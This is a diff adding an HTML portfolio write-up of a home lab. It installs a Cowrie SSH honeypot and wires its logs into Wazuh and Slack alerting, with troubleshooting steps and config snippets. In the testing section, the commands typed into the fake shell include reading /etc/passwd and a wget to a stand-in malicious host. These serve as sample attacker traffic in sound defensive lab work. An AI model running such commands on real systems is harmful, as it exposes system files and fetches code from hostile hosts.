@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cowrie SSH Honeypot — Ethan Chertkov</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #060d09;
+      --surface: #0a110d;
+      --border: #142b1c;
+      --cyan: #22ff7a;
+      --green: #4dffaa;
+      --text: #c9d8cf;
+      --muted: #8aab96;
+      --mono: 'Share Tech Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-weight: 300;
+      line-height: 1.8;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(34,255,122,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(34,255,122,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(6,13,9,0.9);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-logo {
+      font-family: var(--mono);
+      color: var(--cyan);
+      font-size: 0.95rem;
+      text-decoration: none;
+    }
+
+    .nav-back {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      color: var(--muted);
+      text-decoration: none;
+      letter-spacing: 0.1em;
+      transition: color 0.2s;
+    }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '← '; }
+
+    main {
+      position: relative;
+      z-index: 1;
+      max-width: 820px;
+      margin: 0 auto;
+      padding: 8rem 2rem 6rem;
+    }
+
+    .post-meta {
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: var(--muted);
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+
+    .post-title {
+      font-family: var(--mono);
+      font-size: clamp(1.6rem, 4vw, 2.2rem);
+      font-weight: 400;
+      color: #fff;
+      line-height: 1.2;
+      margin-bottom: 1.2rem;
+    }
+
+    .post-title span { color: var(--cyan); }
+
+    .post-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.4rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .tag {
+      font-family: var(--mono);
+      font-size: 0.68rem;
+      padding: 0.2rem 0.6rem;
+      background: rgba(34,255,122,0.06);
+      border: 1px solid rgba(34,255,122,0.15);
+      color: var(--cyan);
+      border-radius: 2px;
+    }
+
+    .post-divider {
+      height: 1px;
+      background: var(--border);
+      margin-bottom: 3rem;
+    }
+
+    .overview-box {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--cyan);
+      border-radius: 4px;
+      padding: 1.5rem 2rem;
+      margin-bottom: 3rem;
+    }
+
+    .overview-box h3 {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--cyan);
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+
+    .overview-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 0.8rem;
+    }
+
+    .overview-item { font-size: 0.88rem; color: var(--muted); }
+    .overview-item strong {
+      color: var(--text);
+      display: block;
+      font-size: 0.75rem;
+      font-family: var(--mono);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 0.2rem;
+    }
+
+    .prose h2 {
+      font-family: var(--mono);
+      font-size: 1.05rem;
+      font-weight: 400;
+      color: var(--cyan);
+      margin: 2.8rem 0 1rem;
+      letter-spacing: 0.05em;
+    }
+    .prose h2::before { content: '// '; opacity: 0.5; }
+
+    .prose h3 {
+      font-family: var(--mono);
+      font-size: 0.88rem;
+      color: var(--text);
+      margin: 2rem 0 0.6rem;
+      letter-spacing: 0.05em;
+    }
+
+    .prose p {
+      font-size: 0.97rem;
+      color: var(--muted);
+      margin-bottom: 1.2rem;
+    }
+
+    .prose ul, .prose ol {
+      padding-left: 1.5rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .prose li {
+      font-size: 0.97rem;
+      color: var(--muted);
+      margin-bottom: 0.5rem;
+    }
+
+    .prose ul li::marker { color: var(--cyan); }
+
+    .prose code {
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      background: rgba(34,255,122,0.06);
+      border: 1px solid rgba(34,255,122,0.12);
+      color: var(--cyan);
+      padding: 0.15rem 0.4rem;
+      border-radius: 2px;
+    }
+
+    .prose pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+    }
+
+    .prose pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      font-size: 0.85rem;
+      color: var(--green);
+      line-height: 1.7;
+    }
+
+    .screenshot {
+      margin: 1.8rem 0;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      overflow: hidden;
+      background: var(--surface);
+    }
+
+    .screenshot img {
+      width: 100%;
+      display: block;
+    }
+
+    .screenshot figcaption {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--muted);
+      padding: 0.6rem 1rem;
+      border-top: 1px solid var(--border);
+      letter-spacing: 0.05em;
+    }
+
+    .callout {
+      background: rgba(34,255,122,0.04);
+      border: 1px solid rgba(34,255,122,0.15);
+      border-radius: 4px;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+      font-size: 0.92rem;
+      color: var(--text);
+    }
+
+    .callout strong {
+      color: var(--cyan);
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      display: block;
+      margin-bottom: 0.4rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      font-size: 0.88rem;
+    }
+
+    th, td {
+      text-align: left;
+      padding: 0.8rem 1rem;
+      border: 1px solid var(--border);
+    }
+
+    th {
+      background: var(--surface);
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: var(--cyan);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      font-weight: 400;
+    }
+
+    td { color: var(--muted); }
+
+    .post-footer {
+      margin-top: 4rem;
+      padding-top: 2rem;
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .back-btn {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      text-decoration: none;
+      padding: 0.75rem 1.8rem;
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      color: var(--text);
+      transition: all 0.2s;
+    }
+    .back-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+
+    .post-date {
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: var(--muted);
+    }
+
+    footer {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 2rem;
+      border-top: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: var(--muted);
+    }
+
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    @media (max-width: 640px) {
+      nav { padding: 1rem 1.5rem; }
+      main { padding: 7rem 1.5rem 4rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <a href="../index.html" class="nav-logo">echkv ~</a>
+    <a href="../index.html#projects" class="nav-back">Back to Projects</a>
+  </nav>
+
+  <main>
+
+    <p class="post-meta">// project writeup &nbsp;·&nbsp; May 2026</p>
+    <h1 class="post-title">Cowrie SSH <span>Honeypot</span></h1>
+    <p style="font-size:1rem; color:var(--muted); margin-bottom:1.5rem;">Extended my Active Directory lab by deploying a Cowrie SSH honeypot that captures every login attempt and command typed by attackers, feeding everything into Wazuh for automated detection and Slack alerting.</p>
+
+    <div class="post-tags">
+      <span class="tag">cowrie</span>
+      <span class="tag">honeypot</span>
+      <span class="tag">ssh</span>
+      <span class="tag">wazuh</span>
+      <span class="tag">ubuntu server</span>
+      <span class="tag">deception</span>
+      <span class="tag">mitre att&ck</span>
+      <span class="tag">mitre d3fend</span>
+      <span class="tag">slack</span>
+      <span class="tag">home-lab</span>
+    </div>
+
+    <div class="overview-box">
+      <h3>Lab Overview</h3>
+      <div class="overview-grid">
+        <div class="overview-item"><strong>Difficulty</strong>Intermediate</div>
+        <div class="overview-item"><strong>Duration</strong>~2 days</div>
+        <div class="overview-item"><strong>New VM</strong>Ubuntu Server 24.04</div>
+        <div class="overview-item"><strong>Honeypot</strong>Cowrie 2.9.19</div>
+        <div class="overview-item"><strong>IP</strong>192.168.10.50</div>
+        <div class="overview-item"><strong>Integration</strong>Wazuh + Slack</div>
+        <div class="overview-item"><strong>Log Format</strong>JSON</div>
+        <div class="overview-item"><strong>Detection</strong>Zero false positives</div>
+      </div>
+    </div>
+
+    <div class="post-divider"></div>
+
+    <div class="prose">
+
+      <h2>Why I Added a Honeypot</h2>
+      <p>After getting Active Directory running and wiring up Wazuh with Slack alerting, I wanted to take the deception side of the SOC further. The existing setup was great at detecting attacks against real machines — but a honeypot adds something different. It's a system that has no legitimate reason for anyone to connect to it, which means any traffic hitting it is automatically suspicious with zero false positives.</p>
+
+      <p>I chose Cowrie — a lightweight SSH honeypot that logs every login attempt, every command an attacker types, and every file they try to upload — and planned to feed all of that straight into the Wazuh manager already running at 192.168.10.10.</p>
+
+      <h2>Updated Lab Topology</h2>
+      <p>The diagram below shows the full updated pipeline with the Cowrie honeypot added as a fifth VM at 192.168.10.50. Kali attacks both the Windows target via RDP and the honeypot via SSH — both paths feed into Wazuh and fire Slack alerts through the same pipeline.</p>
+
+      <figure class="screenshot">
+        <img src="../images/project-04/img-01.png" alt="Updated topology with Cowrie honeypot"/>
+        <figcaption>// fig-01 — Updated lab topology showing the Cowrie honeypot at 192.168.10.50 integrated into the Wazuh pipeline.</figcaption>
+      </figure>
+
+      <h2>Spinning Up the Ubuntu Server VM</h2>
+      <p>Created a fresh Ubuntu Server VM in VirtualBox. The honeypot doesn't need power, it just needs to sit and listen.</p>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Spec</th>
+            <th>Value</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>RAM</td>
+            <td>1 GB</td>
+          </tr>
+          <tr>
+            <td>CPU</td>
+            <td>1 core</td>
+          </tr>
+          <tr>
+            <td>Disk</td>
+            <td>20 GB</td>
+          </tr>
+          <tr>
+            <td>OS</td>
+            <td>Ubuntu Server 24.04</td>
+          </tr>
+          <tr>
+            <td>IP</td>
+            <td>192.168.10.50 (static, internal NAT)</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>Networking Configuration</h3>
+      <p>The first issue was networking. The VM came up on regular VirtualBox NAT, giving internet access but isolating it from the lab. Fixed by adding a second adapter in VirtualBox — Adapter 1 stays as NAT for internet, Adapter 2 set to Internal Network matching <code>AD-Project-Net</code>. Then edited Netplan to assign the static lab IP:</p>
+
+      <pre><code>network:
+  version: 2
+  ethernets:
+    enp0s3:
+      dhcp4: true
+    enp0s8:
+      dhcp4: false
+      addresses: [192.168.10.50/24]
+      nameservers:
+        addresses: [8.8.8.8]</code></pre>
+
+      <p>Applied with <code>sudo netplan apply</code>. Verified with pings to both google.com and 192.168.10.10.</p>
+
+      <h2>Installing Cowrie — Problems and Fixes</h2>
+      <p>This was by far the most frustrating part of the build. Several issues stacked on each other and the documentation was outdated in a few critical places.</p>
+
+      <h3>Cloning the Repo</h3>
+      <p>Created a dedicated user and cloned Cowrie from GitHub:</p>
+
+      <pre><code>sudo adduser --disabled-password cowrie
+sudo su - cowrie
+git clone https://github.com/cowrie/cowrie
+cd cowrie</code></pre>
+
+      <p><strong>Problem:</strong> Python venv package missing</p>
+      <pre><code>python3 -m venv cowrie-env
+# Error: The virtual environment was not created because ensurepip is not available</code></pre>
+
+      <p><strong>Fix:</strong> <code>sudo apt install python3-venv -y</code> — then retry the venv command.</p>
+
+      <h3>Installing Python Dependencies</h3>
+      <p>With the venv fixed, all packages pulled down cleanly:</p>
+
+      <pre><code>python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+pip install --upgrade pip
+pip install -r requirements.txt</code></pre>
+
+      <h3>Authbind and SSH Config</h3>
+      <p><strong>Problem:</strong> authbind directory missing</p>
+      <pre><code>touch /etc/authbind/byport/22
+# Error: touch: cannot touch: No such file or directory</code></pre>
+
+      <p><strong>Fix:</strong> <code>sudo apt install authbind -y</code> — this creates the <code>/etc/authbind/byport/</code> directory.</p>
+
+      <p>Then with authbind installed:</p>
+      <pre><code>sudo touch /etc/authbind/byport/22
+sudo chown echkv /etc/authbind/byport/22
+sudo chmod 770 /etc/authbind/byport/22</code></pre>
+
+      <p><strong>Problem:</strong> <code>sshd_config</code> was a blank file</p>
+      <p><strong>Fix:</strong> OpenSSH wasn't installed. <code>sudo apt install openssh-server -y</code> created the config files. Added <code>Port 2222</code> and ran <code>sudo systemctl restart ssh</code>.</p>
+
+      <h3>Getting Cowrie to Actually Run</h3>
+      <p>This was the most frustrating part of the whole build. Several issues stacked on each other:</p>
+
+      <p><strong>Problem:</strong> <code>bin/cowrie</code> script no longer exists in modern Cowrie</p>
+      <pre><code>bin/cowrie start
+# Error: -bash: bin/cowrie: No such file or directory</code></pre>
+
+      <p><strong>Fix:</strong> The repo structure changed. Install as a Python package first: <code>pip install -e .</code> which creates the <code>cowrie</code> command inside the venv.</p>
+
+      <p><strong>Problem:</strong> Twisted plugin missing — Cowrie starts then immediately dies with SIGTERM</p>
+      <pre><code>twistd: Unknown command: cowrie
+Received SIGTERM, shutting down.</code></pre>
+
+      <p><strong>Fix:</strong> The plugin file wasn't registered. Located it with <code>find ~/cowrie/src -name '*.py' | grep -i plugin</code> then copied it manually into the venv's Twisted plugins directory.</p>
+
+      <p>The copy command that finally fixed it:</p>
+      <pre><code>cp /home/echkv/cowrie/src/twisted/plugins/cowrie_plugin.py \
+   /home/echkv/cowrie/cowrie-env/lib/python3.14/site-packages/twisted/plugins/cowrie_plugin.py</code></pre>
+
+      <p>Launched with the correct PYTHONPATH so Twisted finds the plugin:</p>
+      <pre><code>PYTHONPATH=/home/echkv/cowrie/src twistd --umask=0022 \
+  --pidfile=/home/echkv/cowrie/var/run/cowrie.pid \
+  --logger cowrie.python.logfile.logger cowrie</code></pre>
+
+      <p>Log confirmed success:</p>
+      <pre><code>CowrieSSHFactory starting on 2222
+Ready to accept SSH connections</code></pre>
+
+      <h2>Testing from Kali</h2>
+      <p>With Cowrie running, I connected from the Kali machine:</p>
+      <pre><code>ssh -p 2222 root@192.168.10.50</code></pre>
+
+      <p>After a couple of password attempts Cowrie let the connection through into a convincing fake shell. I typed several commands to generate log data:</p>
+      <ul>
+        <li><code>ls</code></li>
+        <li><code>whoami</code></li>
+        <li><code>cat /etc/passwd</code></li>
+        <li><code>wget http://malicious.example.com</code></li>
+      </ul>
+
+      <p>Checked the JSON log on the honeypot VM:</p>
+      <pre><code>cat ~/cowrie/var/log/cowrie/cowrie.json</code></pre>
+
+      <p>Every session, every login attempt, every command, and every failed download was captured in structured JSON — source IP, timestamp, exact command string, and session ID tying them all together. Exactly what Wazuh needs to ingest.</p>
+
+      <h2>Wiring Cowrie into Wazuh</h2>
+      <p>Installed the Wazuh agent on the honeypot VM, registered it to the manager at 192.168.10.10, then added the Cowrie JSON log as a monitored source in <code>/var/ossec/etc/ossec.conf</code>:</p>
+
+      <pre><code>&lt;localfile&gt;
+  &lt;log_format&gt;json&lt;/log_format&gt;
+  &lt;location&gt;/home/echkv/cowrie/var/log/cowrie/cowrie.json&lt;/location&gt;
+&lt;/localfile&gt;</code></pre>
+
+      <p>Restarted the agent with <code>sudo systemctl restart wazuh-agent</code>. Every connection against the honeypot now flows into Wazuh alongside real machine telemetry. The same MITRE ATT&CK T1110 rule fires on honeypot brute force as on Windows, and the Slack #soc-alerts channel gets the notification within seconds.</p>
+
+      <h2>What This Adds to the Lab</h2>
+      <p>The honeypot sits silently at 192.168.10.50 with nothing running except Cowrie. No real users, no real services, no reason for anything to connect. Any traffic that hits port 2222 is by definition malicious — there is no false positive scenario. Combined with the active response pipeline already in place, the moment Kali touches the honeypot it is logged, alerted, and the source IP blocked across the whole lab automatically.</p>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Capability</th>
+            <th>Detail</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Zero false positives</td>
+            <td>No legitimate traffic should ever reach the honeypot</td>
+          </tr>
+          <tr>
+            <td>Full session logging</td>
+            <td>Every keystroke and command captured in JSON</td>
+          </tr>
+          <tr>
+            <td>Wazuh integration</td>
+            <td>Logs ingested alongside real machine telemetry</td>
+          </tr>
+          <tr>
+            <td>Automatic alerting</td>
+            <td>T1110 fires on brute force, Slack notified instantly</td>
+          </tr>
+          <tr>
+            <td>Auto IP block</td>
+            <td>Active response blocks attacker across the whole lab</td>
+          </tr>
+          <tr>
+            <td>MITRE D3FEND mapping</td>
+            <td>Decoy environment — D3-DE deception technique</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout">
+        <strong>Key Takeaway</strong>
+        A honeypot is one of the few security tools where any alert is a guaranteed true positive. Combined with automated active response, it becomes a real-time tripwire that blocks threats the moment they touch it — no analyst intervention required.
+      </div>
+
+      <h2>Takeaways</h2>
+      <p>This was a smaller extension to the main SOC automation lab, but it added a completely different layer of detection. Honeypots fill a unique role in security — they don't replace traditional monitoring, they complement it. Real machines have false positives. Honeypots don't. That makes them incredibly powerful for early warning and automated response.</p>
+
+      <p>The installation was frustrating — Cowrie's documentation assumes you're following the old install method, and the modern Python package approach broke in several non-obvious ways. But once it was running, the integration with Wazuh was seamless. The same MITRE ATT&CK rules, the same Slack alerts, the same automated blocking — the honeypot just became another data source feeding the pipeline.</p>
+
+      <p>If you're building a SOC lab, I'd highly recommend adding a honeypot after you have your core detection working. It's a low-resource addition that gives you deception-based detection with zero noise.</p>
+
+    </div>
+
+    <div class="post-footer">
+      <a href="../index.html#projects" class="back-btn">← Back to Projects</a>
+      <span class="post-date">// May 2026</span>
+    </div>
+
+  </main>
+
+  <footer>
+    <p>Ethan Chertkov — echkv.github.io</p>
+  </footer>
+
+</body>
+</html>
